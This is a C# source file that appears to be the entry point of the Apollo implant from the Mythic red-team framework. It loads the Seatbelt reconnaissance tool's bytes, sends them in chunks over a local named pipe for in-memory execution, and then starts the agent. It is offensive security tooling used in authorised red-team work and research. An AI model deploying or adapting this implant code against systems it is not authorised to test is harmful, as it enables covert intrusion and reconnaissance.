using System;
using PSKCryptography;
using HttpTransport;
using ApolloInterop.Serializers;
using System.Collections.Generic;
using ApolloInterop.Structs.MythicStructs;
using Apollo.Agent;
using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using System.IO.Pipes;
using ApolloInterop.Structs.ApolloStructs;
using System.Text;
using System.Threading;
using Apollo.Peers.SMB;
using System.Linq;
using System.Collections.Concurrent;

namespace Apollo
{
    class Program
    {
        /*
         * [DllImport("shell32.dll", SetLastError = true)]
static extern IntPtr CommandLineToArgvW(
   [MarshalAs(UnmanagedType.LPWStr)] string lpCmdLine,
   out int pNumArgs);

         */

        private static CancellationTokenSource _cts = new CancellationTokenSource();
        private static AutoResetEvent _senderEvent = new AutoResetEvent(false);
        private static ConcurrentQueue<byte[]> _senderQueue = new ConcurrentQueue<byte[]>();
        private static JsonSerializer _serializer = new JsonSerializer();
        private static AutoResetEvent _complete = new AutoResetEvent(false);
        private static Action<object> _sendAction = (object p) =>
        {
            PipeStream ps = (PipeStream)p;
            while (ps.IsConnected && !_cts.IsCancellationRequested)
            {
                WaitHandle.WaitAny(new WaitHandle[]
                {
                    _senderEvent,
                    _cts.Token.WaitHandle
                });
                if (!_cts.IsCancellationRequested && ps.IsConnected && _senderQueue.TryDequeue(out byte[] result))
                {
                    ps.BeginWrite(result, 0, result.Length, OnAsyncMessageSent, p);
                }
            }
            _complete.Set();
        };
        static void Main(string[] args)
        {
            byte[] asmBytes = System.IO.File.ReadAllBytes(@"C:\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe");
            string[] arg = new string[] { "services" };

            IPCCommandArguments cmdargs = new IPCCommandArguments
            {
                ByteData = asmBytes,
                StringData = "services test=\"user system\" asdf"
            };
            AsyncNamedPipeClient client = new AsyncNamedPipeClient("127.0.0.1", "executetest");
            client.ConnectionEstablished += Client_ConnectionEstablished;
            client.MessageReceived += Client_MessageReceived;
            client.Disconnect += Client_Disconnect;
            client.Connect(3000);
            IPCChunkedData[] chunks = _serializer.SerializeIPCMessage(cmdargs);
            foreach (IPCChunkedData chunk in chunks)
            {
                _senderQueue.Enqueue(Encoding.UTF8.GetBytes(_serializer.Serialize(chunk)));
            }
            _senderEvent.Set();
            _complete.WaitOne();
            // This is main execution.
            Agent.Apollo ap = new Agent.Apollo(Config.PayloadUUID);
            ap.Start();
        }

        private static void Client_Disconnect(object sender, NamedPipeMessageArgs e)
        {
            e.Pipe.Close();
            _cts.Cancel();
            _complete.Set();
        }

        private static void Client_ConnectionEstablished(object sender, NamedPipeMessageArgs e)
        {
            System.Threading.Tasks.Task.Factory.StartNew(_sendAction, e.Pipe);
        }

        public static void OnAsyncMessageSent(IAsyncResult result)
        {
            PipeStream pipe = (PipeStream)result.AsyncState;
            // Potentially delete this since theoretically the sender Task does everything
            if (pipe.IsConnected && !_cts.IsCancellationRequested && _senderQueue.TryDequeue(out byte[] data))
            {
                pipe.EndWrite(result);
                pipe.BeginWrite(data, 0, data.Length, OnAsyncMessageSent, pipe);
            }
        }

        private static void Client_MessageReceived(object sender, NamedPipeMessageArgs e)
        {
            IPCData d = e.Data;
            string msg = Encoding.UTF8.GetString(d.Data.Take(d.DataLength).ToArray());
            Console.Write(msg);
        }
    }

    public class DummyCallback : INamedPipeCallback
    {
        public void OnAsyncConnect(PipeStream pipe, out Object state)
        {
            Console.WriteLine("Connected");
            state = null;
        }

        public void OnAsyncDisconnect(PipeStream pipe, Object state)
        {
            Console.WriteLine("Disconnected :'(");
        }
        public void OnAsyncMessageReceived(PipeStream pipe, IPCData data, Object state)
        {
            string s = Encoding.UTF8.GetString(data.Data, 0, data.DataLength);
            Console.WriteLine($"received a message! {Encoding.UTF8.GetString(data.Data, 0, data.DataLength).Trim()}");
            s += " server reply!";
            byte[] d = Encoding.UTF8.GetBytes(s);
            pipe.BeginWrite(d, 0, d.Length, OnAsyncWriteComplete, pipe);
        }
        public void OnAsyncMessageSent(PipeStream pipe, IPCData data, Object state)
        {
            Console.WriteLine("Sent a message!");
        }

        public void OnAsyncWriteComplete(IAsyncResult result)
        {
            PipeStream pipe = (PipeStream)result.AsyncState;
            pipe.EndWrite(result);
        }
    }
}
